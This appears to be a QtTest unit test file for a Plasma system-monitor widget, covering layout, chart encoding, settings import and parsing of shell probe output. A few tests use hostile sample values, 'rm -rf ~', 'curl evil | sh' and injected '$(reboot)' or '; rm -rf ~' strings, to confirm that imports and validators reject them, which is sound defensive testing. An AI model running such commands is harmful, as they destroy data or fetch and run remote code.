import QtQuick
import QtTest
import "../package/contents/ui/Sections.js" as Sections
import "../package/contents/ui/SectionModels.js" as SectionModels
import "../package/contents/ui/diagram/DiagramData.js" as Data
import "../package/contents/ui/studio/Looks.js" as Looks
import "../package/contents/ui/studio/Schema.js" as Schema
import "../package/contents/ui/Probes.js" as Probes
import "../package/contents/ui/Format.js" as Format
import "../package/contents/ui/DemoData.js" as DemoData
import "../package/contents/ui/network/NetModel.js" as NetModel
import "../package/contents/ui/network/NetHistory.js" as NetHistory
import "../package/contents/ui/network/BrowserTabs.mjs" as BrowserTabs
import "../package/contents/ui/network/NetLock.js" as NetLock

// The JavaScript shared by the widget, both studios and the website.
TestCase {
    name: "SharedLogic"

    readonly property var defaults: ({
            sections: "",
            activeSection: 2,
            chartType: 0,
            bgColor: "#800d0f1a",
            cpuColor: "#44ddaa",
            customCmd: "cat /proc/loadavg",
            targets: "1.1.1.1",
            layoutColumns: 1,
            glowLine: true,
            historySize: 60,
            cpuTitle: "CPU"
        })

    // A monitor with MonitorCore's property names.
    function fakeMonitor() {
        return {
            cpuPercent: 40,
            cpuHistory: [10, 20, 40],
            corePercents: [30, 50, 20, 60, 10, 5, 5, 5, 5, 5],
            coreHistories: Array.from({
                length: 10
            }, () => [1, 2, 3]),
            histories: [[10, -1, 40, 200]],
            activeTarget: 0,
            targetList: ["1.1.1.1"],
            lastPing: 200,
            avgPing: 83,
            jitter: 5,
            lossPercent: 25,
            hoveredLine: "",
            hoveredCore: -1,
            dlHistory: [100, 5000],
            ulHistory: [10, 20],
            downloadSpeed: 5000,
            uploadSpeed: 20,
            sessionDlBytes: 2048,
            sessionUlBytes: 1024,
            disabled: [],
            isLineDisabled(key) {
                return this.disabled.indexOf(key) !== -1;
            }
        };
    }

    function test_sectionsParseKeepsOrderAndDropsUnknown() {
        compare(Sections.parse("memory,cpu,bogus,cpu", 2), ["memory", "cpu"]);
    }
    function test_sectionsParseFallsBackToLegacyIndex() {
        compare(Sections.parse("", 1), ["network"]);
        compare(Sections.parse("", 99), ["cpu"]);
    }
    function test_placementFillsRowsAndSpans() {
        const p = Sections.placement(["cpu", "memory", "network", "disk"], 2, ["network"]);
        compare(p[0], {
            row: 0,
            column: 0,
            span: 1
        });
        compare(p[1], {
            row: 0,
            column: 1,
            span: 1
        });
        compare(p[2], {
            row: 1,
            column: 0,
            span: 2
        });
        compare(p[3], {
            row: 2,
            column: 0,
            span: 1
        });
    }
    function test_placementSpanStartsItsOwnRow() {
        const p = Sections.placement(["cpu", "network", "disk"], 3, ["network"]);
        compare(p[1].row, 1, "a spanning section after a partial row starts a new row");
        compare(p[2].row, 2);
    }

    function test_encodeHeaderAndSamples() {
        const series = [Data.normalize({
                values: [0, 50, 100, -1],
                color: "#ff0000",
                bands: [0, 1, 2, 0],
                gaps: true
            }, {
                lineWidth: 2,
                fill: 0.5
            })];
        const e = Data.encode(series, 100, "line", 2);
        compare(e.width, 256);
        compare(e.bytes[0], 255, "red channel of the colour");
        compare(e.bytes[5], 32, "line width 2 × 16");
        compare(e.bytes[8] & 4, 4, "gaps flag");
        compare(e.bytes[12] * 256 + e.bytes[13], 4, "sample count");
        const at = i => (256 + i) * 4;
        compare(e.bytes[at(0)] * 256 + e.bytes[at(0) + 1], 0);
        compare(e.bytes[at(2)] * 256 + e.bytes[at(2) + 1], 65534, "full scale");
        compare(e.bytes[at(3)] * 256 + e.bytes[at(3) + 1], 65535, "negative is a gap");
        compare(e.bytes[at(1) + 2], 1, "band in the blue channel");
    }
    function test_encodeClampsAboveScaleAndKeepsAlphaOpaque() {
        const e = Data.encode([Data.normalize({
                values: [500, 20],
                color: "#fff"
            }, {
                lineWidth: 2,
                fill: 0
            })], 100, "line", 2);
        compare(e.bytes[1024] * 256 + e.bytes[1025], 65534);
        for (let i = 3; i < e.bytes.length; i += 4)
            compare(e.bytes[i], 255, "a translucent texel would be premultiplied and lose data");
    }
    function test_gaugesEncodeOneCurrentValue() {
        const e = Data.encode([Data.normalize({
                values: [1, 2, 3],
                value: 42,
                color: "#fff"
            }, {
                lineWidth: 2,
                fill: 0
            })], 100, "donut", 2);
        compare(e.bytes[12] * 256 + e.bytes[13], 1);
        compare(Math.round((e.bytes[1024] * 256 + e.bytes[1025]) / 65534 * 100), 42);
    }
    function test_autoMaxHasAFloorAndHeadroom() {
        compare(Data.autoMax([[1, 2], [3]], 1024, 1.2), 1024);
        compare(Data.autoMax([[2000]], 1024, 1.5), 3000);
    }

    function test_lookApplyNeverTouchesCommandsOrHosts() {
        const draft = Object.assign({}, defaults, {
            customCmd: "my own command",
            targets: "10.0.0.1",
            cpuColor: "#123456"
        });
        const next = Looks.apply(draft, defaults, {
            cpuColor: "#abcdef",
            customCmd: "rm -rf ~",
            targets: "evil.example"
        });
        compare(next.cpuColor, "#abcdef");
        compare(next.customCmd, "my own command");
        compare(next.targets, "10.0.0.1");
    }
    function test_lookApplyResetsOtherLookSettings() {
        const draft = Object.assign({}, defaults, {
            bgColor: "#ff000000",
            chartType: 3
        });
        const next = Looks.apply(draft, defaults, {
            chartType: 1
        });
        compare(next.bgColor, defaults.bgColor, "a look is the whole appearance, not a patch");
        compare(next.chartType, 1);
    }
    function test_decodeDropsCommandsAndRejectsBadTypes() {
        const look = Looks.decode(JSON.stringify({
            format: Looks.FORMAT,
            version: 1,
            name: "x",
            settings: {
                cpuColor: "#111111",
                customCmd: "curl evil | sh",
                osFetchCmd: "boom"
            }
        }), defaults);
        compare(Object.keys(look.settings), ["cpuColor"]);
        let threw = false;
        try {
            Looks.decode(JSON.stringify({
                settings: {
                    chartType: "3"
                }
            }), defaults);
        } catch (error) {
            threw = true;
        }
        verify(threw, "a string where a number belongs is rejected");
    }
    function test_encodeDecodeRoundTrip() {
        const text = Looks.encode("Mine", {
            cpuColor: "#222222",
            layoutColumns: 2
        }, defaults);
        const look = Looks.decode(text, defaults);
        compare(look.name, "Mine");
        compare(look.settings.layoutColumns, 2);
        verify(Looks.matches(Looks.apply(defaults, defaults, look.settings), defaults, look.settings));
    }

    function test_schemaStylesRoundTrip() {
        const map = Schema.parseStyles("cpu:line, memory:donut,bad:nope");
        compare(map, {
            cpu: "line",
            memory: "donut"
        });
        compare(Schema.formatStyles(map), "cpu:line,memory:donut");
    }
    function test_everyRowKeyExistsInDefaultsOrHyprland() {
        const hypr = ["monitor", "hAnchor", "verticalPosition", "screenMargin", "widgetWidth", "desktopLayer"];
        const xml = (() => {
                const x = new XMLHttpRequest();
                x.open("GET", Qt.resolvedUrl("../package/contents/config/main.xml"), false);
                x.send();
                return x.responseText;
            })();
        for (const section of Schema.SECTIONS)
            for (const row of section.rows)
                if (row.k)
                    verify(hypr.indexOf(row.k) !== -1 || xml.indexOf('name="' + row.k + '"') !== -1, "studio row for unknown setting " + row.k);
    }

    // The panel pill: which sections, and readings of a fixed width.
    function test_panelShowsPickedSectionsElseTheFirst() {
        compare(Sections.panelIds({
            sections: "memory,cpu",
            panelSections: ""
        }), ["memory"]);
        compare(Sections.panelIds({
            sections: "memory,cpu",
            panelSections: "network, gpu,network"
        }), ["network", "gpu"]);
    }
    function test_pillCaptionsAreShortUnlessRenamed() {
        compare(Sections.shortTitle("sensors", defaults), "Temp");
        compare(Sections.shortTitle("sensors", Object.assign({}, defaults, {
            hwSensorsTitle: "Die"
        })), "Die");
    }
    function test_pillReadings() {
        const m = fakeMonitor();
        const cpu = SectionModels.pill("cpu", m, defaults);
        compare(cpu.lines[0].text, "40%");
        compare(cpu.ratio, 0.4);
        compare(cpu.history, m.cpuHistory);
        const net = SectionModels.pill("network", m, defaults);
        compare(net.lines.map(l => l.mark), ["↓", "↑"]);
        compare(net.lines[0].text, "4.9K/s");
        compare(net.history2, m.ulHistory);
        verify(net.max >= 5000);
        // Latency gaps (-1) draw as zero in the sparkline.
        verify(SectionModels.pill("ping", m, defaults).history.every(v => v >= 0));
    }
    function test_shortRatesStayWithinTheWidestSample() {
        for (const v of [0, 9.94, 999, 1000, 10239, 1023999, 5e9, 999e12])
            verify(Format.short(v).length <= Format.SHORT_WIDEST.length, Format.short(v));
    }

    function test_cpuModelNestsAtMostEightCoreRings() {
        const m = fakeMonitor();
        const model = SectionModels.cpu(m, Object.assign({}, defaults, {
            showCpuCores: true
        }));
        verify(model.cores);
        const rings = model.series("donut").filter(s => s.ring);
        verify(rings.length <= 8);
        verify(rings.every(s => s.ring[0] >= 0.25));
        compare(model.series("line").length, 11, "total plus every core as lines");
    }
    function test_hiddenLinesLeaveTheChart() {
        const m = fakeMonitor();
        m.disabled = ["dl"];
        const series = SectionModels.network(m, defaults).series("line");
        compare(series.length, 1);
        compare(series[0].label, "Upload");
    }
    function test_pingModelMarksBandsGapsAndAlert() {
        const m = fakeMonitor();
        const model = SectionModels.ping(m, Object.assign({}, defaults, {
            pingThresholdColors: true,
            latencyThreshold: 30,
            pingCritColor: "#ff0000"
        }));
        const s = model.series("line")[0];
        compare(s.bands, [0, 0, 1, 2]);
        verify(s.gaps);
        compare(model.readingColor, "#ff0000");
        compare(model.markers[0].value, 30);
        compare(model.stats.map(st => st.label), ["AVG", "JITTER", "LOSS", "MIN / MAX"]);
    }

    function test_colourByLoad() {
        const m = fakeMonitor();
        m.cpuHistory = [10, 75, 95];
        m.cpuPercent = 95;
        const off = SectionModels.cpu(m, defaults);
        compare(off.readingColor, "#44ddaa");
        verify(off.series("line")[0].bands === undefined);
        const cfg = Object.assign({}, defaults, {
            loadColors: true,
            loadWarn: 70,
            loadCrit: 90
        });
        const on = SectionModels.cpu(m, cfg);
        compare(on.series("line")[0].bands, [0, 1, 2]);
        compare(on.series("donut")[0].color, "#ff4444", "gauges take the current level's colour");
        compare(on.readingColor, "#ff4444");
        compare(on.markers[0].value, 70);
    }

    function test_textColourFollowsSolidCard() {
        compare(Sections.textColor({
            useSystemTextColor: true
        }, "#eff0f1"), "#eff0f1");
        compare(Sections.textColor({
            useSystemTextColor: true,
            surfaceStyle: "solid"
        }, "#eff0f1"), "#1e241d");
        compare(Sections.textColor({
            useSystemTextColor: false,
            customTextColor: "#123456",
            surfaceStyle: "solid"
        }, "#eff0f1"), "#123456");
    }

    // ── Probes.js: shell output → objects ─────────────────────────────────────

    function test_interfacesParseKindsAddressesAndRoutes() {
        const list = Probes.parseInterfaces(["if wlp2s0 up wifi aa:bb:cc:dd:ee:ff -", "if enp5s0 down ethernet 11:22:33:44:55:66 1000", "if wg0 unknown vpn - -", "if docker0 down virtual 02:42:00:00:00:01 -", "ip wlp2s0 192.168.1.20/24", "ip wlp2s0 10.0.0.5/8", "ip wg0 10.8.0.2/32", "route wlp2s0 600", "route wlp2s0 20", "route wg0 50", ""].join("\n"));
        compare(list.map(e => e.name), ["wlp2s0", "enp5s0", "wg0", "docker0"]);
        compare(list[0].kind, "wifi");
        compare(list[0].ip, "192.168.1.20", "the first address wins, without its prefix");
        compare(list[0].route, 20, "the lowest metric of several default routes");
        compare(list[0].speed, 0);
        compare(list[1].up, false);
        compare(list[1].speed, 1000);
        compare(list[1].route, -1);
        compare(list[2].up, true, "tunnels in state unknown count as up");
        compare(list[2].mac, "");
        compare(list[3].kind, "virtual");
    }

    function test_autoInterfaceFollowsTheDefaultRoute() {
        const list = Probes.parseInterfaces("if wlp2s0 up wifi - -\nif enp5s0 up ethernet - -\nif wg0 unknown vpn - -\nroute wlp2s0 600\nroute wg0 50\n");
        compare(Probes.autoInterface(list, {}, "x"), "wg0");
        // No default route: the busiest connected physical link.
        const noRoute = Probes.parseInterfaces("if wlp2s0 up wifi - -\nif enp5s0 up ethernet - -\nif wg0 unknown vpn - -\n");
        compare(Probes.autoInterface(noRoute, {
            wlp2s0: {
                rx: 10,
                tx: 0
            },
            enp5s0: {
                rx: 500,
                tx: 5
            },
            wg0: {
                rx: 9000,
                tx: 0
            }
        }, "x"), "enp5s0");
        compare(Probes.autoInterface([], {}, "eth0"), "eth0");
    }

    function test_storageKeepsOneRowPerDeviceAndDropsSmallMounts() {
        const list = Probes.parseStorage(DemoData.DF, "");
        compare(list.map(r => r.mount), ["/", "/mnt/data", "/run/media/usb"], "root first, /home folds into /, /boot is under 256 MiB");
        compare(list[0].fs, "btrfs");
        compare(list[0].size, 1998694907904);
        // Percent as df computes it: used of used + available.
        fuzzyCompare(list[1].percent, 3521377894400 / (3521377894400 + 415440912384) * 100, 1e-9);
    }

    function test_storageMountListPicksAndOrders() {
        compare(Probes.parseStorage(DemoData.DF, " /mnt/data, /boot ,/ ").map(r => r.mount), ["/mnt/data", "/boot", "/"], "listed mounts show even when small");
        compare(Probes.parseStorage(DemoData.DF, "/nope").length, 0);
        compare(Probes.parseStorage("", "").length, 0);
        const spaced = "Filesystem Type 1-blocks Used Available Capacity Mounted on\n/dev/sdc1 ext4 1073741824 0 1073741824 0% /mnt/My Disk";
        compare(Probes.parseStorage(spaced, "")[0].mount, "/mnt/My Disk");
    }

    function test_usageInTheWholesUnit() {
        compare(Format.usage(1215130124288, 1998694907904), "1.1 / 1.8 TiB");
        compare(Format.usage(61439868928, 63999836160), "57 / 60 GiB");
        compare(Format.usage(0, 512 * 1048576), "0 / 512 MiB");
        compare(Format.usage(10, 100), "10 / 100 B");
    }

    function test_processNamesDropNixWrappers() {
        compare(Probes.cleanName(".plasmashell-wr"), "plasmashell");
        compare(Probes.cleanName(".firefox-wrapped"), "firefox");
        compare(Probes.cleanName(".kwin_wayland-w"), "kwin_wayland");
        compare(Probes.cleanName("kworker/0:1"), "kworker/0:1");
    }

    function test_procSnapshotReadsTicksRssAndOddNames() {
        // 52 fields after comm, as in /proc/<pid>/stat.
        const tail = (utime, stime, rss) => {
            const f = ["S"].concat(Array(51).fill("0"));
            f[11] = String(utime);
            f[12] = String(stime);
            f[21] = String(rss);
            return f.join(" ");
        };
        const text = ["cpu  100 0 50 800 10 0 5 0 0 0", "MemTotal:       32768000 kB", "42 (Web Content) " + tail(30, 12, 1000), "77 (weird) (name)) " + tail(1, 2, 3), "99 (short) S 1 2", ""].join("\n");
        const snap = Probes.parseProcSnapshot(text);
        compare(snap.total, 965, "first eight cpu fields");
        compare(snap.memTotal, 32768000 * 1024);
        compare(Object.keys(snap.procs).sort(), ["42", "77"], "truncated lines are skipped");
        compare(snap.procs["42"].name, "Web Content");
        compare(snap.procs["42"].ticks, 42);
        compare(snap.procs["42"].rss, 1000 * 4096);
        compare(snap.procs["77"].name, "weird) (name)");
        compare(snap.procs["77"].ticks, 3);
    }

    function test_topProcessesRanksGroupsAndCounts() {
        const snap = (total, procs) => ({
                    total: total,
                    memTotal: 1000,
                    procs: procs
                });
        const prev = snap(1000, {
            1: {
                name: "a",
                ticks: 10,
                rss: 100
            },
            2: {
                name: "b",
                ticks: 10,
                rss: 50
            },
            3: {
                name: "b",
                ticks: 10,
                rss: 50
            }
        });
        const next = snap(1200, {
            1: {
                name: "a",
                ticks: 40,
                rss: 100
            },
            2: {
                name: "b",
                ticks: 30,
                rss: 50
            },
            3: {
                name: "b",
                ticks: 30,
                rss: 50
            },
            4: {
                name: "c",
                ticks: 999,
                rss: 400
            }
        });
        const grouped = Probes.topProcesses(prev, next, 5, "cpu", true);
        compare(grouped.map(p => p.name), ["b", "a", "c"], "c is new: no CPU yet, so it ranks by memory among the idle");
        compare(grouped[0].count, 2);
        fuzzyCompare(grouped[0].cpu, 20, 1e-9);
        fuzzyCompare(grouped[1].cpu, 15, 1e-9);
        compare(grouped[0].memPercent, 10);
        compare(Probes.topProcesses(prev, next, 5, "cpu", false).length, 4);
        compare(Probes.topProcesses(prev, next, 5, "memory", true)[0].name, "c");
        compare(Probes.topProcesses(prev, next, 2, "cpu", true).length, 2);
        compare(Probes.topProcesses(null, next, 5, "cpu", true)[0].cpu, 0, "the first poll has no CPU delta");
    }

    function test_demoProcessesStayPlausible() {
        for (let i = 1; i < 60; i++) {
            const top = Probes.topProcesses(DemoData.procSnapshot(i - 1), DemoData.procSnapshot(i), 10, "cpu", true);
            const sum = top.reduce((a, p) => a + p.cpu, 0);
            verify(sum > 10 && sum < 100, "step " + i + ": " + sum);
            verify(top.every(p => p.cpu >= 0));
        }
    }

    // ── Network window ───────────────────────────────────────────────────────
    // `ss -tunapiH` as iproute2 6.1 prints it (the first five sockets are
    // verbatim from a real machine, trailing blanks and all), plus the IPv6,
    // UDP and scoped shapes a desktop shows.
    readonly property string ssOutput: ["tcp LISTEN 0      128      0.0.0.0:2024        0.0.0.0:*  ", "\t bbr cwnd:10                                  ", "tcp LISTEN 0      4096   127.0.0.1:43283       0.0.0.0:*   users:((\"environment-man\",pid=84,fd=13))", "\t bbr cwnd:10 tcp-ulp-mptcp                     ", "tcp ESTAB  0      0      192.0.2.2:51918 160.79.104.10:443 users:((\"environment-man\",pid=84,fd=9))", "\t bbr wscale:7,10 rto:204 rtt:0.684/0.745 ato:40 mss:1348 pmtu:1400 rcvmss:1348 advmss:1348 cwnd:57 bytes_sent:25409 bytes_acked:25410 bytes_received:6919 segs_out:76 segs_in:49 data_segs_out:47 data_segs_in:18 bbr:(bw:196967920bps,mrtt:0.132,pacing_gain:2.88672,cwnd_gain:2.88672) send 898666667bps lastsnd:10504 lastrcv:10436 lastack:10436 pacing_rate 951205328bps delivery_rate 196968032bps delivered:48 app_limited busy:12ms rcv_space:13480 rcv_ssthresh:76255 minrtt:0.12 snd_wnd:58752                  ", "tcp ESTAB  0      0      [2a02:8108:1c0:3e00::23]:40310 [2a00:1450:4001:82b::200e]:443 users:((\"Isolated Web Co\",pid=2291,fd=41),(\"firefox\",pid=2211,fd=90))", "\t cubic wscale:7,7 rto:204 rtt:21.5/3.1 cwnd:10 bytes_sent:3481 bytes_acked:3482 bytes_received:10532", "udp UNCONN 0      0            0.0.0.0:5353       0.0.0.0:*    users:((\"avahi-daemon\",pid=812,fd=12))", "udp ESTAB  0      0      192.168.1.23%wlp2s0:68 192.168.1.1:67", "udp UNCONN 0      0               [::]:5353          [::]:*", "tcp ESTAB  0      0      [::ffff:192.168.1.23]:22 [::ffff:192.168.1.40]:51820 users:((\"sshd\",pid=990,fd=4))", "tcp LISTEN 0      128               [::]:22            [::]:*", ""].join("\n")

    function test_socketsParseAddressesProcessesAndCounters() {
        const list = Probes.parseSockets(ssOutput);
        compare(list.length, 9);
        compare(list[0].local, {
            ip: "0.0.0.0",
            port: "2024",
            scope: ""
        });
        compare(list[0].name, "", "other users' sockets have no process");
        compare(list[0].cwnd, 10);
        const estab = list[2];
        compare(estab.name, "environment-man");
        compare(estab.pid, 84);
        compare(estab.bytesSent, 25409);
        compare(estab.bytesReceived, 6919);
        compare(estab.rtt, 0.684);
        compare(estab.cwnd, 57);
        const v6 = list[3];
        compare(v6.remote.ip, "2a00:1450:4001:82b::200e");
        compare(v6.remote.port, "443");
        compare(v6.procs.map(p => p.name), ["Isolated Web Co", "firefox"]);
        compare(list[5].local.scope, "wlp2s0");
        compare(list[5].bytesSent, null, "UDP has no byte counters");
        compare(list[7].local.ip, "192.168.1.23", "IPv4-mapped IPv6 is unwrapped");
        compare(Probes.splitAddress(":::22"), {
            ip: "::",
            port: "22",
            scope: ""
        }, "old ss prints IPv6 without brackets");
    }
    function test_connectionsAndListeningSplitTheSameOutput() {
        const conns = Probes.parseConnections(ssOutput);
        compare(conns.map(c => c.remote.port), ["443", "443", "67", "51820"]);
        const listening = Probes.parseListening(ssOutput);
        compare(listening.length, 5);
        const byPort = {};
        listening.forEach(l => byPort[l.proto + l.ip + ":" + l.port] = l.exposure);
        compare(byPort["tcp127.0.0.1:43283"], "local");
        compare(byPort["tcp0.0.0.0:2024"], "network");
        compare(byPort["tcp:::22"], "network");
        compare(byPort["udp0.0.0.0:5353"], "network");
        compare(listening[listening.length - 1].exposure, "local", "open ports sort first");
        const ports = Probes.listenPorts(Probes.parseSockets(ssOutput));
        compare(Probes.direction(conns[3], ports), "in", "a peer on sshd's listening port came in");
        compare(Probes.direction(conns[0], ports), "out");
        delete ports.tcp["22"];
        compare(Probes.direction(conns[3], ports), "out");
        compare(Probes.parseListening("tcp LISTEN 0 4096 127.0.0.1:631 0.0.0.0:*\n")[0].port, "631", "ss -tulpnH output reads the same");
    }
    function test_addressKinds() {
        const kinds = {
            "127.0.0.1": "loopback",
            "::1": "loopback",
            "192.168.1.1": "lan",
            "10.8.0.1": "lan",
            "172.20.1.1": "lan",
            "172.32.0.1": "internet",
            "100.101.1.1": "lan",
            "fd00::1": "lan",
            "169.254.3.3": "local",
            "fe80::1": "local",
            "224.0.0.251": "multicast",
            "ff02::fb": "multicast",
            "255.255.255.255": "multicast",
            "8.8.8.8": "internet",
            "2a00:1450:4001:82b::200e": "internet",
            "::ffff:10.0.0.2": "lan"
        };
        for (const ip in kinds)
            compare(Probes.addressKind(ip), kinds[ip], ip);
        verify(Probes.safeIp("2a00:1450::1"));
        verify(!Probes.safeIp("1.1.1.1; rm -rf ~"));
    }
    function test_resolveOnlyTakesPlainAddresses() {
        const cmd = Probes.resolveCmd(["1.1.1.1", "$(reboot)", "::1"]);
        verify(cmd.indexOf("q 1.1.1.1 &") !== -1);
        verify(cmd.indexOf("q ::1 &") !== -1);
        verify(cmd.indexOf("reboot") === -1);
        const r = Probes.parseResolve("geo\t/usr/share/GeoIP/GeoLite2-Country.mmdb\t\nhost\t8.8.8.8\tdns.google\tus\t15169\tGOOGLE\nhost\t10.0.0.9\t\t\t\t\nhost\t1.1.1.1\t1.1.1.1\t\t\t\n");
        compare(r.geo, {
            country: true,
            asn: false
        });
        compare(r.hosts["8.8.8.8"], {
            name: "dns.google",
            country: "US",
            asn: 15169,
            org: "GOOGLE"
        });
        compare(r.hosts["1.1.1.1"].name, "", "an address as its own name is no name");
        compare(Probes.baseDomain("fra16s52-in-f14.1e100.net"), "1e100.net");
        compare(Probes.baseDomain("news.bbc.co.uk"), "bbc.co.uk");
        compare(Probes.flag("DE"), "\u{1F1E9}\u{1F1EA}");
        compare(Probes.flag("x"), "");
    }
    function test_appsGroupHelpersUnderTheirApp() {
        const entries = Probes.parseDesktopEntries(["@ org.mozilla.firefox.desktop", "Name=Firefox", "Name[de]=Feuerfuchs", "Icon=firefox", "Exec=env MOZ_X=1 /usr/lib/firefox/firefox %u", "@ com.spotify.Client.desktop", "Name=Spotify", "Icon=com.spotify.Client", "Exec=/usr/bin/flatpak run --branch=stable --command=spotify com.spotify.Client", "@ org.telegram.desktop.desktop", "Name=Telegram", "Icon=telegram", "Exec=telegram-desktop -- %u", "@ org.kde.konsole.desktop", "Name=Konsole", "Exec=konsole", "@ broken.desktop", "Exec=nothing"].join("\n"));
        compare(entries.length, 4, "entries without a name are dropped");
        compare(entries[0].name, "Firefox", "the unlocalised name");
        compare(entries[0].exec, "firefox");
        compare(entries[1].exec, "Client");
        const index = Probes.appIndex(entries);
        compare(Probes.matchApp(index, "telegram-deskto").name, "Telegram", "15-character kernel names match by prefix");
        compare(Probes.matchApp(index, "spotify"), null);
        const tree = Probes.parseProcTree(["1 (systemd) S 0 1 1", "1500 (plasmashell) S 1 1500", "2211 (.firefox-wrapped) S 1500 2211", "2290 (Isolated Web Co) S 2211 2211", "4400 (konsole) S 1500 4400", "4401 (zsh) S 4400 4401", "4410 (curl) S 4401 4401"].join("\n"));
        compare(tree["2211"].name, "firefox");
        compare(Probes.appFor(2290, "Isolated Web Co", tree, index).key, "app:org.mozilla.firefox", "a helper joins its browser");
        compare(Probes.appFor(2211, "firefox", tree, index).name, "Firefox");
        compare(Probes.appFor(4410, "curl", tree, index), {
            key: "proc:curl",
            name: "curl",
            icon: "curl",
            pid: 4410
        }, "a shell's child is not grouped under the terminal");
        compare(Probes.appFor(0, "", tree, index).key, "?");
    }
    function test_sessionTracksRatesAndKeepsEndedConnections() {
        const socket = (port, sent, received) => Probes.parseConnections("tcp ESTAB 0 0 10.0.0.2:" + port + " 1.2.3.4:443 users:((\"curl\",pid=7,fd=3))\n\t cubic rtt:10/2 cwnd:10 bytes_sent:" + sent + " bytes_acked:" + sent + " bytes_received:" + received)[0];
        let s = NetModel.track(null, [socket(5000, 100, 1000), socket(5001, 0, 0)], 1000, {});
        compare(s.list.length, 2);
        compare(s.list[0].rateIn, 0, "no rate on the first poll");
        s = NetModel.track(s, [socket(5000, 300, 5000)], 3000, {});
        compare(s.list[0].rateIn, 2000);
        compare(s.list[0].rateOut, 100);
        compare(s.list[0].since, 1000, "a connection keeps its start");
        compare(s.list[1].ended, true);
        compare(s.list[1].endedAt, 3000);
        s = NetModel.track(s, [socket(5000, 300, 5000)], 5000, {});
        compare(s.list[1].endedAt, 3000, "ended ones keep their end time");
        compare(s.list[0].rateIn, 0);
        const apps = NetModel.apps(s.list);
        compare(apps.length, 1);
        compare(apps[0].active, 1);
        compare(apps[0].ended, 1);
    }
    function test_filtersSortAndOverview() {
        const ctx = {
            index: Probes.appIndex(Probes.parseDesktopEntries(DemoData.NET_DESKTOP))
        };
        let s = null;
        for (let i = 1; i < 45; i++) {
            const parts = Probes.sections(DemoData.netPoll(i));
            ctx.tree = Probes.parseProcTree(parts.proc);
            ctx.ports = Probes.listenPorts(Probes.parseSockets(parts[""]));
            s = NetModel.track(s, Probes.parseConnections(parts[""]), i * 1000, ctx);
        }
        const hosts = DemoData.NET_HOSTS;
        const firefox = NetModel.filter(s.list, {
            app: "app:org.mozilla.firefox"
        }, hosts);
        verify(firefox.length >= 5);
        verify(firefox.every(c => c.app.name === "Firefox"), "helpers count as Firefox");
        compare(NetModel.filter(s.list, {
            query: "github"
        }, hosts).map(c => c.ip).sort(), ["140.82.113.21", "140.82.121.4", "185.199.108.153"]);
        verify(NetModel.filter(s.list, {
            scope: "local"
        }, hosts).every(c => c.kind !== "internet"));
        verify(NetModel.filter(s.list, {
            direction: "in"
        }, hosts).every(c => c.app.name === "Syncthing" || c.app.name === "KDE Connect"));
        compare(NetModel.filter(s.list, {
            country: "AT"
        }, hosts).length, 1);
        compare(NetModel.filter(s.list, {
            ended: false
        }, hosts).filter(c => c.ended).length, 0);
        const sorted = NetModel.sorted(s.list, "rate", true, hosts);
        verify(sorted[0].rateIn + sorted[0].rateOut >= sorted[1].rateIn + sorted[1].rateOut);
        verify(sorted[sorted.length - 1].ended, "ended ones sort last");
        const o = NetModel.overview(s.list, hosts);
        compare(o.apps, 9);
        compare(o.topApps[0].name, "Firefox");
        verify(o.topCountries.length > 0);
        compare(o.ended, 2);
        const groups = NetModel.listeningByApp(Probes.parseListening(Probes.sections(DemoData.netPoll(1))[""]), ctx.tree, ctx.index);
        compare(groups[0].open > 0, true, "apps with open ports first");
        compare(groups.find(g => g.name === "Syncthing").rows.length, 3);
    }
    function test_totalsCountPhysicalLinksOnly() {
        const ifaces = Probes.parseInterfaces(DemoData.NET_INTERFACES);
        const a = Probes.parseNetDev("Inter-| x\n face | y\n    lo: 5 0 0 0 0 0 0 0 5 0 0 0 0 0 0 0\nwlp2s0: 1000 1 0 0 0 0 0 0 500 1 0 0 0 0 0 0\nwg0: 100 1 0 0 0 0 0 0 100 1 0 0 0 0 0 0");
        const b = Probes.parseNetDev("wlp2s0: 3000 1 0 0 0 0 0 0 900 1 0 0 0 0 0 0\nwg0: 300 1 0 0 0 0 0 0 300 1 0 0 0 0 0 0");
        verify(!a.lo);
        const r = NetModel.totalRates(a, b, 2, ifaces);
        compare(r.rx, 1000);
        compare(r.tx, 200);
        compare(r.perIface.wg0.rx, 100);
    }
    function test_dnsAndInterfaceDetails() {
        const dns = Probes.parseDns(DemoData.NET_DNS);
        verify(dns.resolved);
        compare(dns.stats["Cache Hits"], 3431);
        compare(dns.stats["Total Transactions"], 12838);
        compare(dns.links.wlp2s0, ["192.168.1.1", "fd00::1"]);
        compare(Probes.parseDns("@@servers\nnameserver 1.1.1.1\nnameserver 9.9.9.9\n").global, ["1.1.1.1", "9.9.9.9"]);
        const d = Probes.parseIfaceDetails(DemoData.NET_IFACE_DETAILS);
        compare(d.wlp2s0.ipv4, ["192.168.1.23/24"]);
        compare(d.wlp2s0.ipv6.length, 2);
        compare(d.wlp2s0.gateway, "192.168.1.1");
        compare(d.wlp2s0.gateway6, "fe80::1");
        compare(d.wlp2s0.wifi, {
            ssid: "Lighthouse",
            signal: -52,
            quality: 96,
            freq: 5180,
            band: "5 GHz",
            bitrate: "780.0 MBit/s"
        });
        compare(d.wg0.dns, ["10.8.0.1"]);
        compare(d.wg0.wifi, null);
        // Without iw: iwgetid's SSID and /proc/net/wireless's level.
        const plain = Probes.parseIfaceDetails("@@wifi\niface wlan0\nSSID: Cafe Guest\nsignal: -61 dBm\n");
        compare(plain.wlan0.wifi.ssid, "Cafe Guest");
        compare(plain.wlan0.wifi.quality, 78);
        verify(Probes.DNS_CMD.indexOf("resolvectl --no-ask-password statistics") !== -1, "never an interactive polkit query");
        verify(Probes.IFACE_DETAILS_CMD.indexOf("nmcli") === -1);
    }

    // A real mozlz4 file (lz4.block, as Firefox writes it): four tabs, one
    // about:newtab, a title with non-ASCII characters.
    readonly property string geckoSession: "bW96THo0MABkAwAA8wN7IndpbmRvd3MiOiBbeyJ0YWIKAGNlbnRyaWUNAPIedXJsIjogImh0dHBzOi8vd3d3LmV4YW1wbGUub3JnLyIsICJ0aXRsZSI6ICJFGQBPIn0sIDkADk9wYWdlPQAB8RQgcGFnZSDigJMgY2Fmw6kg8J+OpyJ9XSwgImluZGV4IjogMl8AD6UACbNnaXRodWIuY29tL6wAWS9yZXBvbwAJGQAJYAAfMWAABslhYm91dDpuZXd0YWJNAHpOZXcgVGFiqAAPSAAHBE0B+Q9kZS53aWtpcGVkaWEub3JnOjQ0My93aWtpL0dsYXNiAAERAAunABFdEADfcGFkZGluZyI6ICJhYgIA/3lQYmFiIn0="

    function test_firefoxSessionDecodes() {
